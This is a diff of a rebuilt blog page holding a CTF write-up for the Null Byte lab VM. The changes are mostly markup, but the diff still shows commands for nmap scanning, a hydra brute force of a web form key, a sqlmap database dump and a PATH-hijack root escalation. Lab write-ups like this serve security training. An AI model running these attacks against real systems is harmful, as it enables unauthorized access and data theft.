@@ -34,13 +34,13 @@
   <link rel="stylesheet" href="/css/main.min.css">
 
 
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Null Byte Writeup"/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Null Byte Writeup"/>
 <meta name="twitter:description" content="Download VM here.
 Run it on virtualbox, and let&rsquo;s get started.
-0. Get VM&rsquo;s IP:  $ nmap -sn 192.168.1.0/24   1. Enumeration: Now we can continue to scan the machine and the running services.
- Using Zenmap (GUI nmap) : $ nmap -T4 -A -v 192.168.1.142   As you can see there are :
- Apache server running on port 80 rpcbind on port 111 ssh on port 777  2."/>
+0. Get VM&rsquo;s IP: $ nmap -sn 192.168.1.0/24 1. Enumeration: Now we can continue to scan the machine and the running services.
+Using Zenmap (GUI nmap) : $ nmap -T4 -A -v 192.168.1.142 As you can see there are :
+Apache server running on port 80 rpcbind on port 111 ssh on port 777 2. Web Enumeration: let&rsquo;s see the web app running on apache let&rsquo;s discover any directories using dirbuster &raquo; found nothing usefull let&rsquo;s inspect and check the picture in the page, maybe something hidden."/>
+<meta name="twitter:site" content="@Wh1r1w1nd"/>
 
   <script type="application/ld+json">
 {
@@ -214,9 +214,9 @@ Run it on virtualbox, and let&rsquo;s get started.
 <p>From it&rsquo;s source code it seems that the key isn&rsquo;t that hard and we can brute force it
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/9.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>So let&rsquo;s use <code>hydra</code> for that job and you could use burpsuite&rsquo;s intruder too.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#f92672">usage </span>: <span style="color:#ae81ff">hydra -l &lt;USER&gt; -p &lt;Password&gt; &lt;IP Address&gt; http-post-form “&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;”</span>
-<span style="color:#ae81ff">$ hydra 192.168.1.142 http-form-post &#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34; -P /home/sehs/Desktop/stuff/rockyou.txt -la</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">usage </span>: <span style="color:#ae81ff">hydra -l &lt;USER&gt; -p &lt;Password&gt; &lt;IP Address&gt; http-post-form “&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;”</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">$ hydra 192.168.1.142 http-form-post &#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34; -P /home/sehs/Desktop/stuff/rockyou.txt -la</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>we got the password &raquo; <code>elite</code></p>
 <p>Now let&rsquo;s login and see
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/11.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
@@ -243,7 +243,7 @@ And we got these databases.</p>
 </ul>
 <p><code>$ sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch= --dump --columns --tables -D seth</code></p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/15.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<p>ramses' password looks interesting <code>YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>
+<p>ramses&rsquo; password looks interesting <code>YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>
 <ul>
 <li>let&rsquo;s decrypt it as base64 :
 <ul>
@@ -286,9 +286,9 @@ And we got these databases.</p>
 <p>Where executables located:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/23.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <h3 id="then-we-could-manipulate-this-environment-variables-and-get-procwatch-to-run-sh-instead-of-ps-and-this-should-give-us-a-root-shell-d">Then we could manipulate this environment variables and get procwatch to run sh instead of ps, and this should give us a root shell :D</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">ramses<span style="color:#a6e22e">@NullByte</span><span style="color:#f92672">:/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>backup$ ln <span style="color:#f92672">-</span>snf <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh ps
-ramses<span style="color:#a6e22e">@NullByte</span><span style="color:#f92672">:/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>backup$ export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/backup:$PATH&#34;</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/24.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ramses<span style="color:#a6e22e">@NullByte</span>:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>backup$ ln <span style="color:#f92672">-</span>snf <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh ps
+</span></span><span style="display:flex;"><span>ramses<span style="color:#a6e22e">@NullByte</span>:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>backup$ export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/backup:$PATH&#34;</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/24.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>This ln command creates a symlink to sh called ps followed by setting up the path to the current directory which gave us a shell :D</p>
 <p>Got root access :) , opening /root/proof.txt &raquo; gave us the flag and we are done here&hellip;
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/nullbyte/25.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
@@ -418,7 +418,7 @@ ramses<span style="color:#a6e22e">@NullByte</span><span style="color:#f92672">:/
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2020 - 2021</span>
+        <span itemprop="copyrightYear">2020 - 2024</span>
         
          
             <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
